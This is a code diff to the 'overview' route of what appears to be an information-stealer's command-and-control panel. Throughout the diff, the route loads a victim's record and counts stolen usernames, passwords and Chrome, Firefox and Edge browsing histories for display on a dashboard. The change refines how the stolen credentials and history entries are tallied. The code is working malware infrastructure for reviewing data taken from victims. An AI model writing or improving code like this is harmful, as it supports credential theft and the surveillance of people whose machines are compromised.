@@ -145,11 +145,9 @@ def overview():
 
     conn = get_db_connection()
     with conn.cursor(DictCursor) as cursor:
-        # Get victim data
         cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
         victim_data = cursor.fetchone()
 
-        # Get the latest network data (packets sent and received)
         cursor.execute(""" 
             SELECT packets_sent, packets_recv, created_at 
             FROM system_info 
@@ -159,30 +157,26 @@ def overview():
         """, (victim_id,))
         network_data = cursor.fetchall()
 
-        # Get the total number of password cookies and history entries
-        cursor.execute(""" 
-            SELECT COUNT(*) AS total_passwords 
-            FROM system_info 
-            WHERE id = %s AND (usernames IS NOT NULL OR passwords IS NOT NULL)
-        """, (victim_id,))
-        total_passwords = cursor.fetchone()['total_passwords']
+        cursor.execute("SELECT usernames, passwords, chrome_history, firefox_history, edge_history FROM system_info WHERE id = %s", (victim_id,))
+        info = cursor.fetchone()
 
-        cursor.execute(""" 
-            SELECT COUNT(*) AS total_history 
-            FROM system_info 
-            WHERE id = %s AND (chrome_history IS NOT NULL OR firefox_history IS NOT NULL OR edge_history IS NOT NULL)
-        """, (victim_id,))
-        total_history = cursor.fetchone()['total_history']
+        total_passwords = 0
+        if info['usernames']:
+            total_passwords = len(info['usernames'].strip().split('\n'))
+        elif info['passwords']:
+            total_passwords = len(info['passwords'].strip().split('\n'))
 
+        total_history = 0
+        for key in ['chrome_history', 'firefox_history', 'edge_history']:
+            if info[key]:
+                total_history += len(info[key].strip().split('\n'))
     conn.close()
 
     if victim_data and network_data:
-        # Prepare data for the network chart
         labels = [row['created_at'].strftime('%Y-%m-%d %H:%M:%S') for row in network_data]
         packets_sent = [row['packets_sent'] / 1000 for row in network_data]
         packets_recv = [row['packets_recv'] / 1000 for row in network_data]
 
-        # Return the overview page with total counts for passwords and history
         return render_template(
             'overview.html', 
             victim=victim_data, 
